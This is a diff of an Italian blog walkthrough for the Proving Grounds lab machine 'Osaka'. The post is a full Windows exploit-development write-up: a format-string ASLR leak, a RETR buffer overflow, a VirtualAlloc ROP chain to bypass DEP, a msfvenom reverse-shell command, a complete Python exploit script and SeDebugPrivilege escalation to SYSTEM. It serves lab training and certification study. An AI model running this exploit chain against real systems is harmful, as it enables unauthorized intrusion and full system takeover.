@@ -1,7 +1,7 @@
 ---
-title: 'Osaka Walkthrough Proving Grounds Practice: Buffer Overflow, ASLR Bypass e ROP Chain'
+title: 'Osaka Walkthrough Proving Grounds Practice: Buffer Overflow Windows, ASLR e DEP Bypass, ROP Chain'
 slug: osaka
-description: 'Walkthrough Osaka (Proving Grounds Practice): format string leak, ASLR bypass, buffer overflow, ROP chain per bypassare DEP e SeDebugPrivilege.'
+description: 'Walkthrough Osaka Proving Grounds Practice(OffSec): format string leak, ASLR bypass, buffer overflow, ROP chain per bypassare DEP e SeDebugPrivilege.'
 image: /osaka.webp
 draft: true
 date: 2026-03-18T00:00:00.000Z
@@ -14,26 +14,48 @@ tags:
   - Offsec Vm
 ---
 
+In questo walkthrough analizziamo **Osaka**, una macchina Windows di Proving Grounds che richiede lo sviluppo di un exploit reale da zero. Non esistono scorciatoie: ASLR attivo, DEP attivo e nessun exploit pubblico.
+
+Vedrai come ottenere RCE sfruttando un buffer overflow con leak tramite format string, bypassare DEP con una ROP chain basata su VirtualAlloc e ottenere privilegi SYSTEM tramite SeDebugPrivilege.
+
+Questo è un esempio reale di Windows exploit development: buffer overflow Windows, ASLR bypass e DEP bypass tramite ROP chain.
+
+👉 Lab ideale per chi si prepara a OSCP / OSCE3 e vuole padroneggiare exploit development su Windows reale.
+
 **Difficoltà:** Hard | **OS:** Windows | **Piattaforma:** Offensive Security Proving Grounds Practice
+
+## Cos'è un Buffer Overflow (Recap veloce)
+
+Un buffer overflow avviene quando un programma scrive più dati di quanti un buffer possa contenere, sovrascrivendo memoria adiacente. Questo permette di corrompere lo stack, controllare l'esecuzione del programma ed eseguire codice arbitrario.
+
+Nel caso dello stack overflow, l'obiettivo è sovrascrivere l'EIP — il registro che punta alla prossima istruzione da eseguire — per dirottare il flusso del programma verso il nostro shellcode.
 
 ***
 
-## Introduzione
+## Registri CPU — EIP, ESP, EAX (fondamentale)
 
-**Osaka** è una macchina Windows disponibile su Proving Grounds Practice di Offensive Security (OffSec). È una delle poche macchine che richiede un exploit scritto da zero — niente Metasploit, niente exploit pubblici pronti: devi costruire tutto manualmente, step by step.
+Durante un buffer overflow controlli registri critici. Ecco quelli che useremo in questa guida:
 
-È una macchina complessa e completa, che copre exploit development reale su Windows: dalla scoperta della vulnerabilità fino alla privilege escalation finale.
+* **EIP (Instruction Pointer)** — indirizzo della prossima istruzione. È il target principale: se lo sovrascrivi, controlli il programma.
+* **ESP (Stack Pointer)** — punta alla cima dello stack. Dopo il crash, ESP punta esattamente dopo il nostro payload.
+* **EBP (Base Pointer)** — riferimento dello stack frame corrente.
+* **EAX, EBX, ECX, EDX** — registri generici usati per operazioni e puntatori. Nella ROP chain li usiamo per passare parametri a VirtualAlloc.
+* **ESI, EDI** — registri indice, usati nella chain per puntatori a funzioni.
 
-In questa guida troverai:
+Se sovrascrivi EIP controlli il programma. Tutto il resto — ROP chain, ASLR bypass, DEP bypass — serve per arrivare a eseguire il nostro shellcode dopo aver preso controllo di EIP.
 
-* Enumeration con nmap
-* Download e analisi del binario `ftp.exe` con Immunity Debugger e mona
-* Scoperta e sfruttamento di una **Format String Vulnerability** nel comando DEBUG
-* **ASLR bypass** tramite leak dello stack
-* **Buffer Overflow** sul comando RETR (offset 272 byte)
-* **ROP Chain** completa per bypassare DEP tramite VirtualAlloc
-* Analisi dei gadget: cosa usare e cosa scartare dall’output di mona
-* **Privilege Escalation** tramite SeDebugPrivilege
+### 64-bit — differenza con x86
+
+Su x64 i registri si allargano ma il concetto è identico:
+
+| x86 | x64 |
+| --- | --- |
+| EIP | RIP |
+| ESP | RSP |
+| EAX | RAX |
+| EBX | RBX |
+
+Stessa logica, registri da 64 bit invece di 32.
 
 ***
 
@@ -50,7 +72,6 @@ PORT     STATE SERVICE
 139/tcp  open  netbios-ssn
 445/tcp  open  microsoft-ds
 3389/tcp open  ms-wbt-server
-5357/tcp open  wsdapi
 ```
 
 La porta 21 è quella interessante. Il server FTP accetta qualsiasi credenziale.
@@ -67,28 +88,22 @@ ftp> ls
  dev.txt             29 bytes
 ```
 
-Il server espone il suo stesso binario nella directory root. Scarichiamolo.
+Il server espone il suo stesso binario. Lo scarichiamo per analizzarlo localmente — avere il binario è fondamentale per calcolare tutti gli offset prima di toccare il target.
 
 ```
 ftp> binary
 ftp> get ftp.exe
 ```
 
-Avere il binario in locale è fondamentale — ci permette di analizzarlo staticamente, trovare le vulnerabilità e calcolare tutti gli offset prima di toccare il target.
-
 ***
 
 ## Analisi Locale — Immunity Debugger + mona
 
-Carichiamo `ftp.exe` in **Immunity Debugger** su una macchina Windows.
-
-### Step 0 — Setta la cartella di lavoro di mona
+### Step 0 — Setta la cartella di lavoro
 
 ```
 !mona config -set workingfolder c:\Users\hackita\Desktop\Osaka
 ```
-
-Tutti i file generati da mona (bytearray, rop chain, risultati) finiranno qui.
 
 ### Step 1 — Controlla le protezioni
 
@@ -97,101 +112,79 @@ Tutti i file generati da mona (bytearray, rop chain, risultati) finiranno qui.
 ```
 
 ```
-Base       | Top        | ASLR  | NXCompat | SafeSEH | Rebase
-0x00a30000 | 0x00a5b000 | True  | False    | True    | True
+Base       | ASLR  | NXCompat | SafeSEH | Rebase
+0x00a30000 | True  | False    | True    | True
 ```
 
-* **ASLR True** — il binario si carica a un indirizzo casuale ad ogni avvio. Non puoi hardcodare indirizzi.
-* **NXCompat False** — il binario non ha richiesto DEP esplicitamente. Ma attenzione: Windows può forzare DEP a livello di sistema su tutti i processi, indipendentemente da questo flag. Lo scopriamo testando.
-* **SafeSEH True** — i gestori di eccezioni sono protetti. Non ci interessa in questo caso.
-
-> **Nota importante su NXCompat vs DEP:** Sono due livelli diversi. NXCompat False significa che il *binario* non ha chiesto DEP al compilatore. Ma Windows ha la sua policy — se DEP è impostato su `AlwaysOn`, viene forzato su tutti i processi indipendentemente dal binario. Lo scopriamo solo testando lo shellcode direttamente sullo stack.
+* **ASLR True** — indirizzi casuali ad ogni avvio. Non possiamo hardcodare indirizzi. Serve un leak.
+* **NXCompat False** — il binario non ha richiesto DEP. Ma Windows può forzarlo comunque — NXCompat è il flag del binario, DEP è la policy di Windows. Lo scopriamo testando.
+* **SafeSEH True** — gestori di eccezioni protetti. Non ci interessa in questo exploit.
 
 ***
 
 ## Scoperta della Format String Vulnerability
 
-Analizzando il binario con un disassembler notiamo che il server implementa un comando `DEBUG` non documentato. Nel codice troviamo questa chiamata:
+Analizzando il binario troviamo un comando `DEBUG` non documentato. Il problema è nel codice:
 
 ```c
-// Comando normale — format string fissa, sicuro
+// Normale — format string fissa, sicuro
 sub_401060(v27, "%d.%d.%d.%d", v41[0]);
 
-// Comando DEBUG — format string controllata dall'utente, VULNERABILE
+// DEBUG — format string controllata dall'utente, VULNERABILE
 sub_401060(&v23, v26, (char)sub_4010F0);
-sub_401060(&v23, "%s\r\n", (char)&v23);
 ```
 
-`v26` contiene l'input dell'utente. La funzione `sub_401060` è una `sprintf`/`printf`. Il secondo parametro — la format string — non è una stringa fissa ma l'input diretto dell'utente.
-
-Questo è esattamente la definizione di **Format String Vulnerability**.
+`v26` è l'input dell'utente che diventa direttamente la format string. Questo è una **Format String Vulnerability**.
 
 ***
 
 ## Format String Vulnerability — Teoria e Pratica
 
-### Cos'è una format string vulnerability
+`printf("%s", input)` — sicuro. Format string fissa.
 
-`printf("%s", input)` — sicuro. La format string è fissa, l'input è un dato.
+`printf(input)` — vulnerabile. L'input diventa la format string. Se passi `%x`, legge e stampa il prossimo valore sullo stack.
 
-`printf(input)` — vulnerabile. L'input dell'utente *diventa* la format string.
+### I format specifier principali
 
-Se l'utente passa `%x` come input, la funzione interpreta `%x` come istruzione di formattazione e va a prendere il prossimo valore sullo stack, stampandolo in esadecimale.
-
-### I format specifier pericolosi
-
-| Specifier | Cosa fa                                                                                      |
-| --------- | -------------------------------------------------------------------------------------------- |
-| `%x`      | Legge 4 byte dallo stack e li stampa in esadecimale                                          |
-| `%d`      | Legge 4 byte dallo stack e li stampa come intero decimale                                    |
-| `%s`      | Legge 4 byte dallo stack, li interpreta come puntatore e stampa la stringa a quell'indirizzo |
-| `%n`      | **Scrive** nello stack il numero di caratteri stampati finora — il più pericoloso            |
-| `%p`      | Come `%x` ma con formato puntatore (es. `0x00a310f0`)                                        |
-| `%08x`    | Come `%x` ma con padding a 8 caratteri — utile per leggere valori allineati                  |
+| Specifier | Cosa fa                                                              |
+| --------- | -------------------------------------------------------------------- |
+| `%x`      | Legge 4 byte dallo stack, stampa in hex                              |
+| `%d`      | Legge 4 byte dallo stack, stampa come intero                         |
+| `%s`      | Legge 4 byte come puntatore, stampa la stringa a quell'indirizzo     |
+| `%n`      | Scrive nello stack il numero di caratteri stampati — pericolosissimo |
+| `%p`      | Come `%x` ma formato puntatore (0x...)                               |
+| `%08x`    | Come `%x` con padding a 8 caratteri                                  |
 
 ### Come usiamo %x per leakare la base
 
-Lo stack durante l'esecuzione contiene: variabili locali, indirizzi di ritorno, parametri — tutto. Quando il programma gira, sullo stack ci sono indirizzi interni del programma stesso.
-
-Mandando `%x|` ripetuto 100 volte, "fotografiamo" 100 valori consecutivi dallo stack:
+Lo stack contiene indirizzi interni del programma. Mandando `%x|` ripetuto 100 volte, fotografiamo 100 valori consecutivi dallo stack:
 
 ```bash
 quote DEBUG %x|%x|%x|...  # ripetuto 100 volte
 ```
 
-Risposta del server:
+Risposta:
 
 ```
 DEBUG a310f0|7750c9b4|00000000|...
 ```
 
-Il primo valore — `a310f0` — è un indirizzo interno di `ftp.exe`. Da lì calcoliamo la base.
+> **Perché `quote`?** Il client FTP filtra i comandi non standard. Con `quote` mandiamo il comando raw direttamente al server.
 
-> **Perché `quote`?** Il client FTP standard intercetta e blocca i comandi non standard. Con `quote` mandiamo il comando raw al server senza che il client lo filtri.
+### Calcolo degli offset — la logica
 
-### Calcolo degli offset
-
-Con Immunity Debugger in esecuzione:
+ASLR cambia la base del programma ad ogni avvio. Ma gli offset interni sono fissi — li decide il compilatore. È come una città che si sposta ogni giorno: se il bar è sempre a 2km dalla piazza, basta sapere dove si trova la piazza.
 
 ```
-!mona modules -m ftp.exe
-→ Base attuale: 0x00a30000
+!mona modules -m ftp.exe    → base: 0x00a30000
+!mona jmp -r esp -m ftp.exe → jmp esp: 0x00a310da
 
-!mona jmp -r esp -m ftp.exe
-→ jmp esp trovato: 0x00a310da
+Valore leakato %x: 0xa310f0
+Offset leak:       0xa310f0 - 0xa30000 = 0x10f0  ← fisso per sempre
+Offset jmp esp:    0xa310da - 0xa30000 = 0x10da  ← fisso per sempre
 ```
 
-```
-Valore leakato con %x:  0xa310f0
-Base attuale:           0xa30000
-Offset del leak:        0xa310f0 - 0xa30000 = 0x10f0  ← fisso per sempre
-
-Indirizzo jmp esp:      0xa310da
-Base attuale:           0xa30000
-Offset di jmp esp:      0xa310da - 0xa30000 = 0x10da  ← fisso per sempre
-```
-
-Questi due offset non cambiano mai — sono determinati dal compilatore. ASLR cambia solo la base. Quindi ad ogni avvio:
+Ad ogni avvio:
 
 ```python
 distanza_leak    = 0x10f0
@@ -203,47 +196,49 @@ jmp_esp_reale = nuova_base + distanza_jmp_esp
 
 ***
 
+## Buffer Overflow — Checklist Rapida
+
+1. **Fuzzing** — trova quando crasha
+2. **Offset** — trova quanti byte prima di sovrascrivere EIP
+3. **Conferma controllo EIP** — `B*4` in EIP = `42424242`
+4. **Bad chars** — trova i byte che il programma filtra
+5. **JMP ESP** — trova il trampolino
+6. **Shellcode** — genera il payload
+7. **DEP bypass** — se DEP attivo, costruisci ROP chain
+8. **Execution** — lancia e prendi la shell
+
+***
+
 ## Buffer Overflow sul Comando RETR
 
-### Fuzzing — trova quando crasha
+### Fuzzing
 
 ```python
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.10.10.10", 21))
-s.recv(1024)  # banner 220 Welcome
+s.connect(("192.168.14.152", 21))
+s.recv(1024)
 s.send(b"USER hackita\r\n")
 s.recv(1024)
 s.send(b"PASS hackita\r\n")
 s.recv(1024)
-payload = b"A" * 500
-s.send(b"RETR " + payload + b"\r\n")
+s.send(b"RETR " + b"A"*500 + b"\r\n")
 ```
 
-Il programma crasha con 500 `A`. Troviamo l'offset esatto.
-
-### Trova l'offset esatto
+### Offset esatto
 
 ```bash
 msf-pattern_create -l 500
+msf-pattern_offset -q [VALORE_EIP]
+# Risultato: 272
 ```
-
-Manda il pattern al posto delle `A`. In Immunity leggi il valore di EIP al crash e:
-
-```bash
-msf-pattern_offset -q 39694438
-# [*] Exact match at offset 272
-```
-
-**Offset: 272 byte.**
 
 ### Conferma controllo EIP
 
 ```python
 payload = b"A"*272 + b"B"*4
+# EIP = 42424242 → controllo confermato
 ```
-
-Se EIP mostra `42424242` — controlli EIP.
 
 ### Bad Characters
 
@@ -252,12 +247,8 @@ Se EIP mostra `42424242` — controlli EIP.
 ```
 
 ```python
-badchars = bytes(range(1, 256))
-payload = b"A"*272 + b"B"*4 + badchars
-s.send(b"RETR " + payload + b"\r\n")
+payload = b"A"*272 + b"B"*4 + bytes(range(1, 256))
 ```
-
-Dopo il crash, guarda ESP in Immunity e confronta:
 
 ```
 !mona compare -f bytearray.bin -a [INDIRIZZO_ESP]
@@ -265,11 +256,15 @@ Dopo il crash, guarda ESP in Immunity e confronta:
 → Bytes omitted: 00
 ```
 
-Solo `\x00` è un bad char.
+Solo `\x00` come bad char.
 
-### Prima difficoltà — DEP attivo
+### Primo tentativo senza ROP — fallisce
 
-Il primo tentativo senza ROP fallisce. EIP salta su ESP correttamente, ma lo shellcode non esegue — **DEP è attivo**. Serve una ROP Chain.
+```python
+payload = b"A"*272 + jmp_esp_reale.to_bytes(4,'little') + b"\x90"*16 + shellcode
+```
+
+EIP salta su ESP ma lo shellcode non esegue. **DEP è attivo.** Serve ROP.
 
 ***
 
@@ -277,39 +272,31 @@ Il primo tentativo senza ROP fallisce. EIP salta su ESP correttamente, ma lo she
 
 ### Cos'è DEP
 
-DEP (Data Execution Prevention) divide la memoria in due tipi: memoria dove leggi e scrivi dati (stack, heap) e memoria dove esegui codice (sezioni `.text` del binario). Lo stack è dati — con DEP qualsiasi esecuzione sullo stack causa crash immediato.
+DEP divide la memoria in dati (stack) ed eseguibile (codice del binario). Lo stack è dati — qualsiasi esecuzione viene bloccata.
 
 ### Cos'è una ROP Chain
 
-ROP (Return Oriented Programming) bypassa DEP usando codice già esistente nel binario — nelle sezioni eseguibili, non sullo stack.
+ROP usa gadget — piccoli frammenti di codice già presenti nel binario che terminano con `RETN`. `RETN` prende il valore in cima allo stack e ci salta. Se controlli lo stack, controlli la catena.
 
-Un **gadget** è un piccolo frammento di istruzioni già presente nel binario che termina con `RETN`. `RETN` prende il valore in cima allo stack e ci salta. Se controlli lo stack, controlli dove salta ogni `RETN`.
-
-Una **ROP chain** è una lista di indirizzi di gadget messi in sequenza sullo stack. Ogni gadget esegue, poi `RETN` salta al successivo. Risultato: esecuzione arbitraria senza mai scrivere codice sullo stack.
+> **POP vs JMP:** `POP registro` carica un valore nel registro — non esegue nulla, prepara solo. `JMP indirizzo` salta ed esegue. Prima usiamo i `POP` per preparare i registri, poi i `JMP` per eseguire.
 
 ### Perché VirtualAlloc
 
-Lo scopo della chain è chiamare `VirtualAlloc` — una funzione di Windows che alloca nuova memoria con permessi di esecuzione. Una volta allocata questa memoria, ci copiamo lo shellcode e ci saltiamo.
-
-Parametri che carichiamo:
-
-* `EBX = 0x1` (lpAddress — lasciamo scegliere a Windows)
-* `EDX = 0x1000` (dwSize — 4096 byte)
-* `ECX = 0x40` (flProtect — PAGE\_EXECUTE\_READWRITE)
+VirtualAlloc è una Windows API (`kernel32.dll`) che alloca nuova memoria con permessi di esecuzione. Ci mettiamo lo shellcode lì — fuori dallo stack, dove DEP non blocca nulla.
 
 ### Come funziona PUSHAD
 
-`PUSHAD` spinge tutti i registri sullo stack in ordine: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI. VirtualAlloc legge i suoi parametri dallo stack in questo ordine. Dobbiamo quindi caricare i valori giusti nei registri giusti **prima** di chiamare PUSHAD.
+`PUSHAD` spinge tutti i registri sullo stack in ordine fisso: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI. VirtualAlloc legge i parametri in questo ordine. Dobbiamo caricare i valori giusti nei registri giusti prima di PUSHAD.
 
 ***
 
-## Generazione della ROP Chain con mona
+## Generazione della ROP Chain
 
 ```
 !mona rop -m ftp.exe
 ```
 
-Questo è l'XML completo che abbiamo ricevuto:
+XML completo generato da mona:
 
 ```xml
 <gadgets base="0x00a30000">
@@ -337,70 +324,69 @@ Questo è l'XML completo che abbiamo ricevuto:
 </gadgets>
 ```
 
-### La chain standard — cosa fa e perché non la usiamo tutta
+### Perché non usiamo la chain standard (righi 8-15)
 
-I primi gadget dell'XML sono la **chain standard** per caricare VirtualAlloc in ESI in modo indiretto:
+I righi 8-15 sono la chain standard per caricare VirtualAlloc in ESI in modo indiretto: POP ECX → MOV EAX,\[ECX] → INC ESI → ADD ESI,EAX. L'abbiamo testata — non funziona.
 
-```
-POP ECX        → ECX = 0x1e008 (indirizzo del puntatore a VirtualAlloc)
-MOV EAX,[ECX]  → EAX = valore a quell'indirizzo = VirtualAlloc
-POP ESI        → ESI = 0xffffffff
-INC ESI        → ESI = 0x00000000
-ADD ESI,EAX    → ESI = 0 + VirtualAlloc = VirtualAlloc
-```
+Inoltre al rigo 27 il valore sotto `POP EAX` è `0x90909090` — un NOP inutile. EAX conterrebbe spazzatura.
 
-Questo percorso esiste perché non sempre è possibile caricare direttamente VirtualAlloc in ESI. In questo binario però esiste un gadget più diretto: `JMP [EAX]`.
+### La soluzione — JMP \[EAX]
 
-### Gadget aggiuntivo — JMP \[EAX]
-
-`JMP [EAX]` non è nell'XML di mona rop — va cercato a mano. I byte di questa istruzione in assembly sono `\xff\x20`:
+`JMP [EAX]` salta all'indirizzo contenuto in EAX. Se EAX ha il puntatore a VirtualAlloc, `JMP [EAX]` ci porta direttamente lì. Non è nell'XML di mona — va cercato a mano:
 
 ```
 !mona find -s "\xff\x20" -m ftp.exe
-→ 0x00a44adb  (offset dalla base: 0x14adb)
+→ 0x00a44adb  (offset: 0x14adb)
 ```
 
-Attenzione, l'XML cambierà ogni volta che iniziate la vm, e controllate solo virtualalloc.xml non i vari txt.
+`\xff\x20` sono i byte di `JMP [EAX]` in assembly.
 
-### Chain alternativa — cosa abbiamo tenuto e cosa abbiamo scartato
+### Cosa abbiamo tenuto e cosa abbiamo scartato
 
-**RIMOSSO — parte complessa della chain standard:**
+**Scartato — righi 8-15** (chain standard che non funziona)
 
-| Gadget                           | Offset    | Motivo rimozione                         |
-| -------------------------------- | --------- | ---------------------------------------- |
-| POP ECX                          | `0x5181`  | Sostituito                               |
-| ptr VirtualAlloc come valore ECX | `0x1e008` | EAX lo carica direttamente               |
-| MOV EAX,\[ECX]                   | `0x9a8f`  | Rimosso — EAX viene caricato con POP EAX |
-| POP ESI                          | `0xc9d6`  | Spostato con valore diverso              |
-| `0xffffffff`                     | —         | Non più necessario                       |
-| INC ESI                          | `0xe5eb`  | Rimosso                                  |
-| ADD ESI,EAX                      | `0x4336`  | Rimosso                                  |
-| junk Filler                      | —         | Rimosso                                  |
+**Modificato:**
 
-**MANTENUTO e riorganizzato — chain alternativa:**
+* Rigo 27 — il NOP sotto `POP EAX` diventa `0x1e008` (puntatore a VirtualAlloc)
+* Rigo 11 — `POP ESI` tenuto ma con valore `JMP [EAX]` al posto di `0xffffffff`
 
-| Gadget           | Offset    | Scopo                                                                 |
-| ---------------- | --------- | --------------------------------------------------------------------- |
-| POP EBP          | `0x7e14`  | Carica EBP                                                            |
-| POP EBP (skip)   | `0x7e14`  | Il secondo POP EBP consuma il valore successivo sullo stack come skip |
-| POP EBX          | `0x13bf`  | EBX = 1                                                               |
-| `0x1`            | —         | Valore per EBX                                                        |
-| POP EDX          | `0x1bd7e` | EDX = 0x1000                                                          |
-| `0x1000`         | —         | Valore per EDX (size)                                                 |
-| POP ECX          | `0x5181`  | ECX = 0x40                                                            |
-| `0x40`           | —         | Valore per ECX (PAGE\_EXECUTE\_READWRITE)                             |
-| POP EDI          | `0x4655`  | EDI = RETN NOP                                                        |
-| RETN NOP         | `0x4682`  | Gadget neutro — placeholder                                           |
-| POP ESI          | `0xc9d6`  | ESI = JMP \[EAX]                                                      |
-| JMP \[EAX]       | `0x14adb` | Valore per ESI — salta al valore puntato da EAX                       |
-| POP EAX          | `0x1d2bf` | EAX = puntatore a VirtualAlloc                                        |
-| ptr VirtualAlloc | `0x1e008` | Valore per EAX                                                        |
-| PUSHAD           | `0x10d6`  | Spinge tutti i registri sullo stack → innesca VirtualAlloc            |
-| JMP ESP          | `0x10da`  | Salta allo shellcode dopo l'allocazione                               |
+**Il meccanismo ESI + EAX:**
 
-**Il meccanismo chiave:** ESI contiene `JMP [EAX]`. EAX contiene il puntatore a VirtualAlloc. Quando PUSHAD spinge i registri, il meccanismo di chiamata usa ESI per saltare — `JMP [EAX]` porta direttamente a VirtualAlloc. Più corto, più diretto della chain standard.
+```
+POP ESI → ESI = JMP [EAX]  (indirizzo 0x14adb in ftp.exe)
+POP EAX → EAX = ptr VirtualAlloc  (0x1e008)
+```
+
+POP non esegue nulla — prepara i registri. È PUSHAD che innesca tutto. Quando parte la catena, `JMP [EAX]` tramite ESI salta al valore di EAX — cioè a VirtualAlloc.
+
+Stesso meccanismo di EIP → JMP ESP → shellcode. Solo un livello sopra: ESI → JMP \[EAX] → EAX → VirtualAlloc.
+
+### Chain finale con i nostri offset
+
+```python
+rop_gadgets = [
+    0x7e14  + nuova_base,  # POP EBP
+    0x7e14  + nuova_base,  # skip 4 bytes
+    0x13bf  + nuova_base,  # POP EBX
+    0x1,                   # EBX = 1
+    0x1bd7e + nuova_base,  # POP EDX
+    0x1000,                # EDX = 0x1000 (size)
+    0x5181  + nuova_base,  # POP ECX
+    0x40,                  # ECX = 0x40 (PAGE_EXECUTE_READWRITE)
+    0x4655  + nuova_base,  # POP EDI
+    0x4682  + nuova_base,  # RETN NOP (valore EDI)
+    0xc9d6  + nuova_base,  # POP ESI
+    0x14adb + nuova_base,  # JMP [EAX] — da !mona find (valore ESI)
+    0x1d2bf + nuova_base,  # POP EAX
+    0x1e008 + nuova_base,  # ptr VirtualAlloc — dall'XML (valore EAX)
+    0x10d6  + nuova_base,  # PUSHAD
+    0x10da  + nuova_base,  # JMP ESP
+]
+```
 
 ***
+
+### ![](/rop_chain_flow%20\(1\).svg)
 
 ## Exploit Completo
 
@@ -417,20 +403,19 @@ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
 import socket
 from struct import pack
 
-# Offset calcolati una volta sola con mona
 distanza_leak    = 0x10f0
 distanza_jmp_esp = 0x10da
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.14.152", 21))
-s.recv(1024)  # banner 220 Welcome
+s.recv(1024)
 
 s.send(b"USER hackita\r\n")
 s.recv(1024)
 s.send(b"PASS hackita\r\n")
 s.recv(1024)
 
-# ASLR Bypass — leak tramite format string
+# ASLR Bypass
 s.send(b"DEBUG " + b"%x|"*100 + b"\r\n")
 leak = s.recv(1024)
 leak_value = int(leak.split(b"|")[0].split(b" ")[-1], 16)
@@ -440,40 +425,38 @@ print(f"Leak:          {hex(leak_value)}")
 print(f"Nuova base:    {hex(nuova_base)}")
 print(f"jmp esp reale: {hex(jmp_esp_reale)}")
 
-# Shellcode (generato con msfvenom -b "\x00")
 buf = b""
 buf += b"[SOSTITUIRE CON IL PROPRIO SHELLCODE]"
 
-# ROP Chain alternativa con JMP [EAX]
 rop_gadgets = [
-    0x7e14  + nuova_base,  # POP EBP
-    0x7e14  + nuova_base,  # skip 4 bytes
-    0x13bf  + nuova_base,  # POP EBX
-    0x1,                   # EBX = 1
-    0x1bd7e + nuova_base,  # POP EDX
-    0x1000,                # EDX = 0x1000 (size)
-    0x5181  + nuova_base,  # POP ECX
-    0x40,                  # ECX = 0x40 (PAGE_EXECUTE_READWRITE)
-    0x4655  + nuova_base,  # POP EDI
-    0x4682  + nuova_base,  # RETN NOP (valore per EDI)
-    0xc9d6  + nuova_base,  # POP ESI
-    0x14adb + nuova_base,  # JMP [EAX] (valore per ESI)
-    0x1d2bf + nuova_base,  # POP EAX
-    0x1e008 + nuova_base,  # ptr to VirtualAlloc (valore per EAX)
-    0x10d6  + nuova_base,  # PUSHAD # RETN
-    0x10da  + nuova_base,  # JMP ESP
+    0x7e14  + nuova_base,
+    0x7e14  + nuova_base,
+    0x13bf  + nuova_base,
+    0x1,
+    0x1bd7e + nuova_base,
+    0x1000,
+    0x5181  + nuova_base,
+    0x40,
+    0x4655  + nuova_base,
+    0x4682  + nuova_base,
+    0xc9d6  + nuova_base,
+    0x14adb + nuova_base,
+    0x1d2bf + nuova_base,
+    0x1e008 + nuova_base,
+    0x10d6  + nuova_base,
+    0x10da  + nuova_base,
 ]
 
 rop = b""
 for g in rop_gadgets:
-    rop += pack("<I", g)  # little endian, 4 byte per gadget
+    rop += pack("<I", g)
 
 total = 1000
-payload  = b"A"*272        # padding fino a EIP
-payload += rop             # ROP chain
-payload += b"\x90"*16     # NOP sled
-payload += buf             # shellcode
-payload += b"B"*(total - len(payload))  # padding finale
+payload  = b"A"*272
+payload += rop
+payload += b"\x90"*16
+payload += buf
+payload += b"B"*(total - len(payload))
 
 input("Listener pronto? premi invio...")
 s.send(b"RETR " + payload + b"\r\n")
@@ -496,7 +479,7 @@ C:\dev> whoami /priv
 SeDebugPrivilege    Debug programs    Enabled
 ```
 
-`SeDebugPrivilege` permette di iniettare codice in processi che girano come SYSTEM — come `winlogon.exe`.
+`SeDebugPrivilege` permette di iniettare codice in processi SYSTEM come `winlogon.exe`.
 
 **Su Kali:**
 
@@ -535,44 +518,45 @@ SYSTEM ottenuto.
 | DEP        | Attivo (forzato da Windows) | ROP Chain + VirtualAlloc          |
 | SafeSEH    | Attivo                      | Non sfruttato                     |
 
-| Step                 | Tecnica                                 |
-| -------------------- | --------------------------------------- |
-| Leak base address    | Format String — `DEBUG %x\|` x100       |
-| BOF offset           | 272 byte — trovato con msf-pattern      |
-| Bypass DEP           | ROP Chain alternativa con JMP \[EAX]    |
-| Shellcode esecuzione | VirtualAlloc → PAGE\_EXECUTE\_READWRITE |
-| Privesc              | SeDebugPrivilege + psgetsys.ps1         |
+| Step              | Tecnica                                           |
+| ----------------- | ------------------------------------------------- |
+| Leak base address | `DEBUG %x\|` x100 — offset 0x10f0                 |
+| BOF offset        | 272 byte — msf-pattern                            |
+| Bypass DEP        | ROP chain con JMP \[EAX] + VirtualAlloc           |
+| Shellcode         | VirtualAlloc → PAGE\_EXECUTE\_READWRITE → JMP ESP |
+| Privesc           | SeDebugPrivilege + psgetsys.ps1                   |
 
 ***
 
 ## Concetti Chiave
 
-**Format String Vulnerability** nasce da `printf(input)` invece di `printf("%s", input)`. Con `%x` leggi valori dallo stack — inclusi indirizzi interni del programma. Con `%x` ripetuto 100 volte ottieni una fotografia dello stack.
+**Format String Vulnerability** — `printf(input)` invece di `printf("%s", input)`. Con `%x` leggi valori dallo stack. Con `%x` ripetuto fotografi indirizzi interni del programma.
 
-**ASLR** randomizza solo la base. Gli offset tra gadget e base sono fissi — il compilatore li decide una volta sola. Una volta leakato la base, sai dove si trova tutto.
+**ASLR** — randomizza solo la base. Gli offset interni sono fissi — li decide il compilatore. Leakato la base, sai dove si trova tutto.
 
-**NXCompat vs DEP** sono due livelli diversi. NXCompat è il flag del binario. DEP è la policy di Windows. Windows vince sempre.
+**NXCompat vs DEP** — NXCompat è il flag del binario. DEP è la policy di Windows. Windows vince sempre.
 
-**ROP Chain** usa gadget già esistenti nel binario nelle sezioni eseguibili. Ogni gadget finisce con RETN. RETN salta al prossimo valore sullo stack — creando una catena.
+**ROP Chain** — gadget già nel binario, ognuno termina con RETN. POP prepara i registri senza eseguire nulla. JMP salta ed esegue. PUSHAD innesca la catena.
 
-**Chain alternativa vs standard:** La standard carica VirtualAlloc in ESI in modo indiretto tramite POP ECX → MOV EAX,\[ECX] → INC/ADD. La alternativa usa JMP \[EAX] — più corta, stesso risultato.
+**VirtualAlloc** — Windows API che alloca memoria eseguibile fuori dallo stack. DEP non blocca quella memoria. Lo shellcode ci va dentro e viene eseguito.
+
+**ESI + EAX + JMP \[EAX]** — ESI contiene `JMP [EAX]`. EAX contiene il puntatore a VirtualAlloc. Quando la chain esegue, `JMP [EAX]` porta direttamente a VirtualAlloc. Stesso meccanismo di EIP → JMP ESP → shellcode, ma un livello sopra.
+
+***
+
+## Formazione HackIta
+
+Vuoi diventare realmente forte su exploit development e OSCP?
+
+Visita [https://hackita.it/servizi](https://hackita.it/servizi)
+
+Testiamo anche la sicurezza della tua azienda.
+
+Supporta HackIta: [https://hackita.it/supporto](https://hackita.it/supporto)
 
 ***
 
-***Walkthrough scritto a scopo educativo per Hackita. Testa solo su macchine di tua proprietà o su piattaforme autorizzate come Proving Grounds.***
-
-## Riferimenti e Risorse
-
-### 🔗 Approfondimenti Tecnici
-
-* Osaka Proving Grounds Walkthrough\
-  [https://routezero.security/2024/11/29/proving-grounds-practice-osaka-walkthrough/](https://routezero.security/2024/11/29/proving-grounds-practice-osaka-walkthrough/)
-* Buffer Overflow Osaka PG Writeup\
-  [https://medium.com/@aaronashley466/bufferoverflow-osaka-pg-560654fb9ea5](https://medium.com/@aaronashley466/bufferoverflow-osaka-pg-560654fb9ea5)
-* Microsoft Docs — VirtualAlloc API\
-  [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
-
-***
